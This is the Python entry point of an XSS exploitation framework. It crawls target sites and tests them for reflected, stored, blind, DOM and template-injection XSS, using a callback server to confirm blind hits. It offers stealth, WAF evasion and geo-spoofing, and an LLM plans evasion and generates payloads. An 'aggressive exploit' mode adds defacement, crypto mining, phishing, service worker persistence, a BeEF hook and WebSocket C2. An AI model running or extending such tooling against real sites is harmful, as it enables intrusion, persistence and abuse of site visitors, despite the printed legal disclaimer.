#!/usr/bin/env python3
"""
xss_ultimate v3.0 — Next-Gen XSS Detection, Exploitation & Post-Exploitation Framework
AI-enhanced comprehensive testing for Reflected, Stored/Blind, DOM-based, Client-side, 
Browser-side, Server-side (SSTI), Mutation, Prototype Pollution XSS with advanced C2.
"""
import argparse
import json
import random
import sys
import time
import os
from pathlib import Path
from datetime import datetime
from typing import List, Dict

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

import requests

from . import config
from . import utils
from .spider import SiteSpider, InjectionSurface
from .js_analyzer import JSAnalyzer
from .response_analyzer import ResponseAnalyzer, WAFDetector
from .reflected import ReflectedXSSTester, HeaderXSSTester
from .stored import StoredXSSTester, BlindXSSTester
from .dom_xss import DOMXSSTester
from .collab_server import CollabServer
from .post_exploit import PostExploitEngine
from .headless_verifier import HeadlessVerifier
from .waf_bypass import WAFBypass
from .payload_engine import PayloadEngine
from .ai_integration import GroqClient, AIInjectionAnalyzer, AIEnhancedPayloadEngine, AIResponseAnalyzer
from .advanced_post_exploit import AdvancedPostExploitEngine
from .clientside_xss import ClientSideXSSTester, ServerSideTemplateInjectionTester


class XSSUltimate:
    def __init__(self, args):
        self.args = args
        self.session = utils.setup_session(proxy=args.proxy, retries=config.MAX_RETRIES)
        self.timeout = args.timeout or config.DEFAULT_TIMEOUT
        self.geo_spoof = args.geo_spoof
        self.aggressive_waf = args.aggressive_waf
        self.stealth = args.stealth
        self.all_results = []
        self.collab_server = None
        self.collab_url = args.collab if args.collab else None
        
        self.groq_client = None
        self.ai_analyzer = None
        self.ai_payload_engine = None
        self.ai_response_analyzer = None
        if config.ENABLE_AI and config.GROQ_API_KEY:
            self.groq_client = GroqClient(config.GROQ_API_KEY, config.GROQ_MODEL, config.GROQ_BASE_URL)
            self.ai_analyzer = AIInjectionAnalyzer(self.groq_client)
            self.ai_payload_engine = AIEnhancedPayloadEngine(self.groq_client, self.collab_url)
            self.ai_response_analyzer = AIResponseAnalyzer(self.groq_client)
            print(f"  [AI] Groq AI integration enabled ({config.GROQ_MODEL})")

    def run(self):
        args = self.args
        target_url = self.args.url.rstrip("/")
        self._print_banner()
        self._legal_disclaimer()
        self._setup()

        # PHASE 1: Recon & Attack Surface Mapping
        spider = SiteSpider(target_url, self.session, self.timeout, args.max_pages, self.geo_spoof)
        spider_results = spider.crawl()
        injection_points = spider.get_injection_points()
        js_analysis = JSAnalyzer(self.session, self.timeout, self.geo_spoof)
        js_results = js_analysis.analyze_all(spider_results.get("scripts", []), target_url)

        # Detect framework, CSP and encoding
        initial_resp = utils.fetch_url(self.session, target_url, self.timeout, self.geo_spoof)
        framework = {}
        csp = {}
        encoding = "UTF-8"
        waf_info = {"waf_detected": [], "csp": {}}
        if initial_resp:
            framework = utils.detect_framework(initial_resp.text)
            csp = utils.parse_csp(initial_resp.headers)
            encoding = utils.detect_encoding(initial_resp)
            waf_info = WAFDetector().detect(initial_resp)
            waf_info["csp"] = csp
            print(f"  Encoding: {encoding}")
            if framework:
                print(f"  Detected frameworks: {framework}")
            if csp:
                print(f"  CSP: {json.dumps(csp, indent=2)}")
            csp_bypasses = ResponseAnalyzer().detect_csp_bypass(csp, "<script>alert(1)</script>")
            if csp_bypasses:
                print(f"  CSP observations: {', '.join(csp_bypasses)}")
            if waf_info.get("waf_detected"):
                print(f"  WAF Detected: {', '.join(waf_info['waf_detected'])}")

        # AI-powered injection point analysis
        target_info = {
            "url": target_url,
            "framework": framework,
            "csp": csp,
            "encoding": encoding,
            "headers": dict(initial_resp.headers) if initial_resp else {},
        }
        ai_analysis = None
        if self.ai_analyzer:
            print("\n  [AI] Analyzing attack surface with Groq...")
            ai_analysis = self.ai_analyzer.analyze_target(spider_results, target_info)
            print(f"  [AI] Found {len(ai_analysis.candidates)} priority injection points")
            print(f"  [AI] Strategy: {ai_analysis.global_strategy}")
            if ai_analysis.waf_evasion_plan:
                print(f"  [AI] WAF Evasion: {', '.join(ai_analysis.waf_evasion_plan)}")

        # Start collab server for blind XSS
        if not self.collab_url:
            self.collab_server = CollabServer(port=args.collab_port)
            self.collab_server.start()
            self.collab_url = self.collab_server.get_callback_url()
            print(f"  Blind XSS callback URL: {self.collab_url}")
            
            if self.ai_payload_engine:
                self.ai_payload_engine.collab_url = self.collab_url

        # PHASE 2: Reflected XSS (Enhanced with AI)
        reflected_tester = ReflectedXSSTester(
            self.session, self.timeout, args.delay, self.geo_spoof, self.aggressive_waf, args.max_payloads,
            collab_url=self.collab_url,
            ai_payload_engine=self.ai_payload_engine,
            ai_response_analyzer=self.ai_response_analyzer,
            ai_analysis=ai_analysis,
        )
        reflected_results = reflected_tester.test_all_points(injection_points)
        self.all_results.extend(reflected_results)

        # Header XSS
        header_tester = HeaderXSSTester(self.session, self.timeout, self.geo_spoof)
        payloads = PayloadEngine(self.collab_url).generate_reflected(max_payloads=15)
        header_results = header_tester.test_headers(spider_results.get("urls", []), payloads)
        self.all_results.extend(header_results)

        # PHASE 3: Stored / Blind XSS
        surface_finder = InjectionSurface(self.session, self.timeout, self.geo_spoof)
        storage_surfaces = list(spider_results.get("forms", []))
        for url in spider_results.get("urls", [])[:5]:
            storage_surfaces.extend(surface_finder.discover_storage_surfaces(url))
        seen = set()
        deduped = []
        for s in storage_surfaces:
            key = (s.get("url", ""), s.get("type", "form"), tuple(s.get("fields", [s.get("type", "form")])))
            if key not in seen:
                seen.add(key)
                deduped.append(s)
            if len(deduped) >= 12:
                break
        storage_surfaces = deduped

        stored_tester = StoredXSSTester(self.session, self.timeout, args.delay, self.geo_spoof, collab_url=self.collab_url)
        stored_results = stored_tester.test_storage_surfaces(storage_surfaces)
        self.all_results.extend(stored_results)

        blind_tester = BlindXSSTester(self.session, self.collab_url, self.timeout, args.delay, self.geo_spoof)
        blind_results = blind_tester.test_blind_surfaces(storage_surfaces)
        self.all_results.extend(blind_results)

        # PHASE 3B: Server-Side Template Injection (SSTI)
        ssti_tester = ServerSideTemplateInjectionTester(self.session, self.timeout, args.delay, self.geo_spoof, self.collab_url)
        ssti_results = ssti_tester.test_ssti(injection_points)
        self.all_results.extend(ssti_results)

        # PHASE 4: DOM-based XSS
        dom_tester = DOMXSSTester(self.session, self.timeout, args.delay, self.geo_spoof, collab_url=self.collab_url)
        dom_results = dom_tester.analyze_and_test(spider_results, target_url, js_analysis=js_results)
        self.all_results.extend(dom_results)

        # PHASE 4B: Client-Side / Browser-Side XSS
        clientside_tester = ClientSideXSSTester(self.session, self.timeout, args.delay, self.geo_spoof, collab_url=self.collab_url)
        clientside_results = clientside_tester.test_all_client_side(spider_results, target_url, js_results)
        self.all_results.extend(clientside_results)

        # Wait for blind XSS callbacks
        if self.collab_server and (blind_results or ssti_results):
            print(f"\n  Waiting for blind XSS/SSTI callbacks (up to {args.blind_wait}s)...")
            time.sleep(min(args.blind_wait, 15))
            interactions = self.collab_server.get_interactions()
            if interactions:
                print(f"  Received {len(interactions)} callbacks!")
                for interaction in interactions:
                    blind_confirmed = {
                        "xss_type": "blind_xss_confirmed",
                        "url": f"{self.collab_url}{interaction['path']}",
                        "method": interaction["method"],
                        "params": interaction.get("params", {}),
                        "payload": f"Callback from {interaction['remote_ip']}",
                        "detection_method": "Blind XSS callback received",
                        "confidence": 0.95,
                        "injection_point": "blind_xss",
                        "collab_data": interaction,
                    }
                    self.all_results.append(blind_confirmed)
                    print(f"    [V] BLIND XSS CONFIRMED: {interaction['path']} from {interaction['remote_ip']}")

        # Deduplicate results
        self.all_results = self._dedupe_results(self.all_results)

        # PHASE 5: Advanced Post-Exploitation
        if self.all_results and args.post_exploit:
            post_exploit = AdvancedPostExploitEngine(
                self.session, self.collab_url, self.timeout,
                aggressive=args.aggressive_exploit,
                collab_server=self.collab_server,
            )
            exploit_results = post_exploit.exploit_all(self.all_results)
            if args.generate_poc:
                poc_html = post_exploit.generate_advanced_poc(self.all_results, exploit_results)
                poc_path = config.RESULTS_DIR / f"poc_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
                utils.save_html(poc_path, poc_html)
                print(f"\n  PoC HTML saved: {poc_path}")

        # Stop collab server
        if self.collab_server:
            self.collab_server.stop()

        # Report
        self._report()

    def _dedupe_results(self, results: List[Dict]) -> List[Dict]:
        seen = set()
        deduped = []
        for r in results:
            key = (
                r.get("xss_type", ""),
                r.get("url", ""),
                r.get("payload", ""),
                r.get("sink", ""),
                r.get("injection_point", ""),
            )
            if key not in seen:
                seen.add(key)
                deduped.append(r)
        if len(deduped) != len(results):
            print(f"\n  Deduplicated results: {len(results)} -> {len(deduped)}")
        return deduped

    def _setup(self):
        if self.stealth:
            print("[*] Stealth mode: random delays + randomized headers")
        if self.aggressive_waf:
            print("[*] Aggressive WAF evasion: per-request header randomization + adaptive delays")
        if self.geo_spoof:
            print("[*] Geo-spoofing enabled")
        if self.args.proxy:
            print(f"[*] Using proxy: {self.args.proxy}")
        if self.args.collab:
            print(f"[*] Using external collab server: {self.args.collab}")
        if self.args.aggressive_exploit:
            print("[!] Aggressive exploitation: destructive/persistent/C2 techniques enabled (use with permission)")
        if config.ENABLE_AI and config.GROQ_API_KEY:
            print("[*] AI-enhanced payload generation & analysis enabled")
        if self.args.results_dir:
            config.RESULTS_DIR = Path(self.args.results_dir)
            config.RESULTS_DIR.mkdir(parents=True, exist_ok=True)
        if self.args.verbose:
            print(f"[*] Verbose mode enabled (reports go to {config.RESULTS_DIR})")

    def _print_banner(self):
        banner = f"""
{'='*70}
   XSS ULTIMATE v{config.VERSION}
   Next-Gen XSS Detection, Exploitation & Post-Exploitation
   Target: {self.args.url}
   Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
{'='*70}
"""
        print(banner)

    def _legal_disclaimer(self):
        print(f"\n{'!'*60}")
        print("LEGAL: Only scan sites you own or have explicit permission.")
        print("Unauthorized testing may violate applicable laws.")
        print(f"{'!'*60}\n")

    def _report(self):
        print(f"\n{'='*70}")
        if self.all_results:
            print(f"SCAN COMPLETE — {len(self.all_results)} vulnerabilities found")
            print(f"{'='*70}\n")
            by_type = {}
            for r in self.all_results:
                rt = r.get("xss_type", "unknown")
                by_type.setdefault(rt, 0)
                by_type[rt] += 1
            for t, c in by_type.items():
                print(f"  {t.upper():35s}: {c}")
            print(f"\n  {'Total':35s}: {sum(by_type.values())}")
            print()
            for idx, r in enumerate(self.all_results, 1):
                print(f"  #{idx:3d} [{r.get('xss_type','?').upper():20s}] {r.get('url',''):55s}")
                print(f"       Payload: {r.get('payload','')[:90]}")
                print(f"       Method: {r.get('detection_method','')} | Confidence: {r.get('confidence',0):.0%}")
                if self.args.verbose:
                    if r.get("injected_url"):
                        print(f"       Trigger URL: {r['injected_url']}")
                    if r.get("params"):
                        print(f"       Params: {', '.join(r['params'][:5])}")
                if r.get("bypasses"):
                    print(f"       Bypasses: {', '.join(r['bypasses'])}")
                if r.get("collab_data"):
                    print(f"       Callback: {r['collab_data'].get('remote_ip','')} at {r['collab_data'].get('timestamp','')}")
                if r.get("sink"):
                    print(f"       Sink: {r['sink']}")
                print()
            utils.generate_report(self.all_results, self.args.url)
        else:
            print("SCAN COMPLETE — No vulnerabilities detected")
            print(f"{'='*70}")
            print("\n  The target appears secure against tested vectors.")
            print("  Suggestions:")
            print("    - Try with --aggressive-waf for more evasion")
            print("    - Try with --stealth for slower, less detectable scan")
            print("    - Try with --enable-ai for AI-powered analysis")
            print("    - Verify the URL is accessible and returns 200 OK")
            print("    - Check if the site requires authentication\n")


def main():
    parser = argparse.ArgumentParser(
        description="xss_ultimate v3.0 — Next-Gen XSS Scanner & Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python -m xss_ultimate.main --url http://test.site/page.php?q=test
  python -m xss_ultimate.main --url http://test.site --stealth --aggressive-waf --geo-spoof
  python -m xss_ultimate.main --url http://test.site --blind-wait 60 --collab http://my-server.com
  python -m xss_ultimate.main --url http://test.site --post-exploit --generate-poc
  python -m xss_ultimate.main --url http://test.site --post-exploit --aggressive-exploit --generate-poc
  python -m xss_ultimate.main --url http://test.site --enable-ai --groq-key YOUR_KEY --post-exploit --aggressive-exploit --generate-poc
        """,
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--timeout", type=int, default=config.DEFAULT_TIMEOUT, help="Request timeout (seconds)")
    parser.add_argument("--delay", type=float, default=0.2, help="Delay between requests")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--stealth", action="store_true", help="Stealth mode (random delays)")
    parser.add_argument("--aggressive-waf", action="store_true", help="Aggressive WAF evasion")
    parser.add_argument("--geo-spoof", action="store_true", help="Geo-spoofing headers")
    parser.add_argument("--collab", help="External collab server URL (e.g., http://your-server.com)")
    parser.add_argument("--collab-port", type=int, default=config.COLLAB_PORT, help="Collab server port")
    parser.add_argument("--blind-wait", type=int, default=30, help="Seconds to wait for blind XSS callbacks")
    parser.add_argument("--max-pages", type=int, default=config.MAX_CRAWL_PAGES, help="Max pages to crawl")
    parser.add_argument("--post-exploit", action="store_true", help="Enable automatic post-exploitation")
    parser.add_argument("--aggressive-exploit", action="store_true", help="Destructive/persistent/C2 exploitation (defacement, crypto miner, port scan, phishing, storage poisoning, clickjacking, service worker persistence, BeEF hook, WebSocket C2)")
    parser.add_argument("--generate-poc", action="store_true", help="Generate HTML PoC file (includes exploitation results)")
    parser.add_argument("--max-payloads", type=int, default=0, help="Limit payloads per test (0=all)")
    parser.add_argument("--results-dir", default=str(config.RESULTS_DIR), help="Directory for scan reports")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    
    # AI Integration
    parser.add_argument("--enable-ai", action="store_true", help="Enable AI-powered analysis (requires Groq API key)")
    parser.add_argument("--groq-key", help="Groq API key for AI integration")
    parser.add_argument("--groq-model", default="mixtral-8x7b-32768", help="Groq model to use")
    
    args = parser.parse_args()
    
    if args.enable_ai or args.groq_key:
        config.ENABLE_AI = True
        config.GROQ_API_KEY = args.groq_key or config.GROQ_API_KEY
        config.GROQ_MODEL = args.groq_model
    
    requests.packages.urllib3.disable_warnings()

    try:
        scanner = XSSUltimate(args)
        scanner.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()